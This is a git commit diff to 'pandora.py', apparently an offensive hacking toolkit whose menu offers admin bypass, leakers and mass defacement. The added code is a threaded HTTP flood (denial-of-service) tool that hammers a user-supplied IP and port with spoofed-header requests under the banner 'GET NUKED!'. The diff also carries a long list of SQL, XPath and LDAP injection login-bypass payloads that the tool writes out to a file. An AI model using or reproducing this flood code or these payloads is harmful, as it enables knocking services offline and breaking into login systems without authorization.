ff20e5de7e7db6e07076f2c7ae0bc67e020da87f
MrSanZz <95021841+MrSanZz@users.noreply.github.com>
2023-12-17 23:28:36 +0700

    Update pandora.py

--- pandora.py
+++ pandora.py
@@ -2115,7 +2115,7 @@ elif answer == ("20"):
     {yellow}│{blue} [05] Bypasser Admin With ID {red}[Hot Results]{blue}          [15] CCTV Hunter                             {yellow}│{blue}
     {yellow}│{blue} [06] Leaker Tools V3 {red}[Hot Results]{blue}                 [16] Heart                                   {yellow}│{blue}
     {yellow}│{blue} [07] Mass Deface V3                                [17] BXB maker                               {yellow}│{blue}
-    {yellow}│{blue} [08] DIRBER                                                                                     {yellow}│{blue}
+    {yellow}│{blue} [08] DIRBER                                        [18] HTTP FLOOD                              {yellow}│{blue}
     {yellow}│{blue} [09] Bypass Admin With File.txt                                                                 {yellow}│{blue}
     {yellow}│{blue} [10] Leaker V4 {red}[Hot Results]{blue}                                                                    {yellow}│{blue}
     {yellow}└─────────────────────────────────────────────────────────────────────────────────────────────────┘{blue}
@@ -3681,17 +3681,15 @@ elif answer == ("20"):
         jso = input(f"Your JSO Script : ")
         loges = input(f"Save AS [example : BXB1 ] : ")
         print("wait..")
-        N = f"""
-        #BXB 2
+        N = "#BXB 2"
+        N += ""
+        N += "or '=' --+ 'or limit 1=1 1-- -+ or 1=1- ' /* admin' or '1'='1 admin' 'or 1=1 == True or Pass --+ admin' ''='"
+        N += "or"
+        N += """'or '='--+'("1"="1"# )--+'or 1=1 limit 1-- -+ '') SELECT id, username, password, left(password, 8)-- -+ or (("x"))=(("x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin'/*"""
+        N += ""
+        N += "#BXB 3"
+        N += f"""' or 1=1 limit 1-- -+ 'or 1=1 limit 1 -- -+ 'or 1=1 limit 1 - -+ SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` `` password=password=1; 'order by 1--  - 'union select 1,2-- - admin' # admin' or '1'='1 admin' or '1'='1'# admin' or 1=1 or ''=' 'or 1=1 limits 1 -- -+ ' or '1'='1 ' or 'x'='x ' or 0=0 -- ' or 0=0 # 1=0 UNION ALL SELECT admin password 1234 123456 root toor test guest ' or '1'='1 ' or ''=' ' or 1]%00 ' or /* or ' ' or "a" or ' ' or 1 or ' ' or true() or ' 'or string-length(name(.))<10 or' 'or contains(name,'adm') or' 'or contains(.,'adm') or' 'or position()=2 or' admin' or ' admin' or '1'='2 * *)(& *)(|(& pwd) *)(|(* *))%00 admin)(&) pwd admin)(!(&(| pwd)) admin))(|(| 1234 '-' ' ' '&' '^' '*' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' "-" " " "&" "^" "*" " or ""-" " or "" " " or ""&" " or ""^" " or ""*" or true-- " or true-- ' or true-- ") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x " or "x"="x ") or ("x")=("x ")) or (("x"))=(("x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' # admin'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220 admin" -- admin" # admin"/* admin" or "1"="1 admin" or "1"="1"-- admin" or "1"="1"# admin" or "1"="1"/* admin"or 1=1 or ""=" admin" or 1=1 admin" or 1=1-- admin" or 1=1# admin" or 1=1/* admin") or ("1"="1 admin") or ("1"="1"-- admin") or ("1"="1"# admin") or ("1"="1"/* admin") or "1"="1 admin") or "1"="1"-- admin") or "1"="1"# admin") or "1"="1"/* 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220 == "> ") " ') {jso} <" = "> ") " ') '{jso} <" ' ' -- ' # ' – '-- '/* '# " -- " # "/* ' and 1='1 ' and a='a or true ' or ''=' " or ""=" 1′) and '1′='1– ' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055 " AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055 ' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220 " AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220 and 1=1 and 1=1– ' and 'one'='one ' and 'one'='one– ' group by password having 1=1-- ' group by userid having 1=1-- ' group by username having 1=1-- like '%' or 0=0 -- or 0=0 # or 0=0 – ' or         0=0 # ' or 0=0 -- ' or 0=0 # ' or 0=0 – " or 0=0 -- " or 0=0 # " or 0=0 – %' or '0'='0 or 1=1– ' or 1=1-- ' or '1'='1 ' or '1'='1'-- ' or '1'='1'/* ' or '1'='1'# ' or '1′='1 ' or 1=1 ' or 1=1 -- ' or 1=1 – ' or 1=1;# ' or 1=1/* ' or 1=1# ' or 1=1– ') or '1'='1 ') or '1'='1-- ') or '1'='1'-- ') or '1'='1'/* ') or '1'='1'# ') or ('1'='1 ') or ('1'='1-- ') or ('1'='1'-- ') or ('1'='1'/* ') or ('1'='1'# 'or'1=1 'or'1=1′ " or "1"="1 " or "1"="1"-- " or "1"="1"/* " or "1"="1"# " or 1=1 " or 1=1 -- " or 1=1 – " or 1=1-- " or 1=1/* " or 1=1# " or 1=1– ") or "1"="1 ") or "1"="1"-- ") or "1"="1"/* ") or "1"="1"# ") or ("1"="1 ") or ("1"="1"-- ") or ("1"="1"/* ") or ("1"="1"# ) or '1′='1– ) or ('1′='1– ' or 1=1 LIMIT 1;# 'or 1=1 or ''=' "or 1=1 or ""=" ' or a=a-- ' or a=a– " or "a"="a ") or ("a"="a ') or ('a'='a and hi") or ("a"="a ' or 'one'='one ' or 'one'='one– ' or uid like '% ' or uname like '% ' or userid like '% ' or user like '% ' or username like '% ') or ('x'='x ' OR 'x'='x'#; '=' 'or' and '=' 'or' ' UNION ALL SELECT 1, @@version;# ' UNION ALL SELECT system_user(),user();# ' UNION select table_schema,table_name FROM information_Schema.tables;# admin' and substring(password/text(),1,1)='7 ' and substring(password/text(),1,1)='7 ' or 1=1-- ' or 'one'='one 'or 1=1-- - 1'or'1'='1 'or''='"""
 
-        or '=' --+ 'or limit 1=1 1-- -+ or 1=1- ' /* admin' or '1'='1 admin' 'or 1=1 == True or Pass --+ admin' ''='
-        or
-        'or '='--+'("1"="1"# )--+'or 1=1 limit 1-- -+ '') SELECT id, username, password, left(password, 8)-- -+ or (("x"))=(("x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin'/*
-
-        #BXB 3
-        ' or 1=1 limit 1-- -+ 'or 1=1 limit 1 -- -+ 'or 1=1 limit 1 - -+ SELECT id, username, left(password, 8) AS snipped_password, email FROM accounts WHERE username='admin' AND`` `` password=password=1; 'order by 1--  - 'union select 1,2-- - admin' # admin' or '1'='1 admin' or '1'='1'# admin' or 1=1 or ''=' 'or 1=1 limits 1 -- -+ ' or '1'='1 ' or 'x'='x ' or 0=0 -- ' or 0=0 # 1=0 UNION ALL SELECT admin password 1234 123456 root toor test guest ' or '1'='1 ' or ''=' ' or 1]%00 ' or /* or ' ' or "a" or ' ' or 1 or ' ' or true() or ' 'or string-length(name(.))<10 or' 'or contains(name,'adm') or' 'or contains(.,'adm') or' 'or position()=2 or' admin' or ' admin' or '1'='2 * *)(& *)(|(& pwd) *)(|(* *))%00 admin)(&) pwd admin)(!(&(| pwd)) admin))(|(| 1234 '-' ' ' '&' '^' '*' ' or ''-' ' or '' ' ' or ''&' ' or ''^' ' or ''*' "-" " " "&" "^" "*" " or ""-" " or "" " " or ""&" " or ""^" " or ""*" or true-- " or true-- ' or true-- ") or true-- ') or true-- ' or 'x'='x ') or ('x')=('x ')) or (('x'))=(('x " or "x"="x ") or ("x")=("x ")) or (("x"))=(("x or 1=1 or 1=1-- or 1=1# or 1=1/* admin' -- admin' # admin'/* admin' or '1'='1 admin' or '1'='1'-- admin' or '1'='1'# admin' or '1'='1'/* admin'or 1=1 or ''=' admin' or 1=1 admin' or 1=1-- admin' or 1=1# admin' or 1=1/* admin') or ('1'='1 admin') or ('1'='1'-- admin') or ('1'='1'# admin') or ('1'='1'/* admin') or '1'='1 admin') or '1'='1'-- admin') or '1'='1'# admin') or '1'='1'/* 1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055 1234 ' AND 1=0 UNION ALL SELECT 'admin', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220 admin" -- admin" # admin"/* admin" or "1"="1 admin" or "1"="1"-- admin" or "1"="1"# admin" or "1"="1"/* admin"or 1=1 or ""=" admin" or 1=1 admin" or 1=1-- admin" or 1=1# admin" or 1=1/* admin") or ("1"="1 admin") or ("1"="1"-- admin") or ("1"="1"# admin") or ("1"="1"/* admin") or "1"="1 admin") or "1"="1"-- admin") or "1"="1"# admin") or "1"="1"/* 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055 1234 " AND 1=0 UNION ALL SELECT "admin", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220 == "> ") " ') {jso} <" = "> ") " ') '{jso} <" ' ' -- ' # ' – '-- '/* '# " -- " # "/* ' and 1='1 ' and a='a or true ' or ''=' " or ""=" 1′) and '1′='1– ' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055 " AND 1=0 UNION ALL SELECT "", "81dc9bdb52d04dc20036dbd8313ed055 ' AND 1=0 UNION ALL SELECT '', '7110eda4d09e062aa5e4a390b0a572ac0d2c0220 " AND 1=0 UNION ALL SELECT "", "7110eda4d09e062aa5e4a390b0a572ac0d2c0220 and 1=1 and 1=1– ' and 'one'='one ' and 'one'='one– ' group by password having 1=1-- ' group by userid having 1=1-- ' group by username having 1=1-- like '%' or 0=0 -- or 0=0 # or 0=0 – ' or         0=0 # ' or 0=0 -- ' or 0=0 # ' or 0=0 – " or 0=0 -- " or 0=0 # " or 0=0 – %' or '0'='0 or 1=1– ' or 1=1-- ' or '1'='1 ' or '1'='1'-- ' or '1'='1'/* ' or '1'='1'# ' or '1′='1 ' or 1=1 ' or 1=1 -- ' or 1=1 – ' or 1=1;# ' or 1=1/* ' or 1=1# ' or 1=1– ') or '1'='1 ') or '1'='1-- ') or '1'='1'-- ') or '1'='1'/* ') or '1'='1'# ') or ('1'='1 ') or ('1'='1-- ') or ('1'='1'-- ') or ('1'='1'/* ') or ('1'='1'# 'or'1=1 'or'1=1′ " or "1"="1 " or "1"="1"-- " or "1"="1"/* " or "1"="1"# " or 1=1 " or 1=1 -- " or 1=1 – " or 1=1-- " or 1=1/* " or 1=1# " or 1=1– ") or "1"="1 ") or "1"="1"-- ") or "1"="1"/* ") or "1"="1"# ") or ("1"="1 ") or ("1"="1"-- ") or ("1"="1"/* ") or ("1"="1"# ) or '1′='1– ) or ('1′='1– ' or 1=1 LIMIT 1;# 'or 1=1 or ''=' "or 1=1 or ""=" ' or a=a-- ' or a=a– " or "a"="a ") or ("a"="a ') or ('a'='a and hi") or ("a"="a ' or 'one'='one ' or 'one'='one– ' or uid like '% ' or uname like '% ' or userid like '% ' or user like '% ' or username like '% ') or ('x'='x ' OR 'x'='x'#; '=' 'or' and '=' 'or' ' UNION ALL SELECT 1, @@version;# ' UNION ALL SELECT system_user(),user();# ' UNION select table_schema,table_name FROM information_Schema.tables;# admin' and substring(password/text(),1,1)='7 ' and substring(password/text(),1,1)='7 ' or 1=1-- ' or 'one'='one 'or 1=1-- - 1'or'1'='1 'or''='
-
-        """
         def logger(N):
                 file = open((loges) + ".txt", "a")
                 file.write(str(N))
@@ -3699,6 +3697,102 @@ elif answer == ("20"):
                 file.close()
         logger(N)
         print(f"Success, Check it on {loges}.txt")
+    elif answer == '18':
+        pass
+        if os.name == 'posix':
+            os.system('clear')
+        elif os.name == 'nt':
+            os.system('cls')
+        ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+                   'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
+        logo = """
+                    777955057                     
+                 7080888080888907                 
+               78880099999690880887               
+             508009999494949999968084             
+            808694949494949494949466801           
+            080699994949494949499996085           
+            18888806666969666666008088            
+               4068808080888088800177             
+                   17   177  77                   
+                        440                       
+                        808                       
+                 78861775557716807                
+                     7 74147 7                    
+                       70807                      
+                       22560                      
+                      74177777                    
+                 18088808080808577                
+                4880695555545998084               
+                
+                WH00PZ ! GET NUKED!
+        """
+        print(logo)
+        ip = str(input("IP TARGET : "))
+        port = int(input("PORT : "))
+        thrd = int(input("THREAD : "))
+        if os.name == 'posix':
+            os.system('clear')
+        elif os.name == 'nt':
+            os.system('cls')
+        print(logo)
+        def flood():
+            try:
+                ang = ['1','2','3','4','5','6','7','8','9','0']
+                n1 = random.choice(ang)
+                n2 = random.choice(ang)
+                n3 = random.choice(ang)
+                n4 = random.choice(ang)
+                n5 = random.choice(ang)
+                n6 = random.choice(ang)
+                n7 = random.choice(ang)
+                n8 = random.choice(ang)
+                n9 = random.choice(ang)
+                n10 = random.choice(ang)
+                n11 = random.choice(ang)
+                fip = f"1{n1}{n2}.{n3}{n4}{n5}.{n6}.{n7}:{n8}{n9}{n10}{n11}"
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.connect((ip,port))
+                s.sendto(("GET /" + ip + " HTTP/1.1\r\n\r\n").encode('ascii'), (ip,port))
+                s.sendto(("Host: " + str(fip) + "\r\n\r\n").encode('ascii'), (ip,port))
+                s.sendall(b"GET / HTTP/1.1\r\nHost: " + ip.encode() + b"\r\n\r\n")
+                req = "GET " + str(ip) + " HTTP/1.1\r\n"
+                req += "Host: " + str(fip) + "\r\n"
+                req += "Proxt-agent: " + str(fip) + "\r\n"
+                req += "User-Agent: " + random.choice(ua) + "\r\n"
+                req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n'"
+                req += "Connection: keep-alive\r\n"
+                req2 = "GET / HTTP/2.0\r\n"
+                req2 += "Cache-Control: max-age=0\r\n"
+                req2 += 'Sec-Ch-Ua: "Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"\r\n'
+                req2 += "Sec-Ch-Ua-Mobile: ?0\r\n"
+                req2 += 'Sec-Ch-Ua-Platform: "Windows"\r\n'
+                req2 += "Dnt: 1\r\n"
+                req2 += "Upgrade-Insecure-Requests: 1\r\n"
+                req2 += "User-Agent: "+random.choice(ua)+"\r\n"
+                req2 += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"
+                req2 += "Sec-Fetch-Site: none"
+                req2 += "Sec-Fetch-Mode: navigate"
+                req2 += "Sec-Fetch-User: ?1"
+                req2 += "Sec-Fetch-Dest: document"
+                req2 += "Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
+                req2 += "Accept-Encoding: gzip, deflate, br"
+                req2 += "Host: "+ip+""
+                req2 += "X-HTTPS: 1"
+                req2 += "Content-Length: 0"
+                req2 += "Host: " + str(fip) + "\r\n"
+                req2 += "Proxt-agent: " + str(fip) + "\r\n"
+                s.sendto((req).encode('ascii'), (ip,port))
+                s.sendto((req2).encode('ascii'), (ip,port))
+                s.close()
+                print(f"{yellow}Ion Cannon Loaded : {red}", i, f"{yellow}%", end='\r')
+            except ConnectionResetError:
+                print("Connection Reset", end='\r')
+            except TimeoutError:
+                print("Request Timeout", end='\r')
+        for i in range(thrd):
+            t = threading.Thread(target=flood)
+            t.start()
     else:
         print(green + f"Exit..")
         exit()
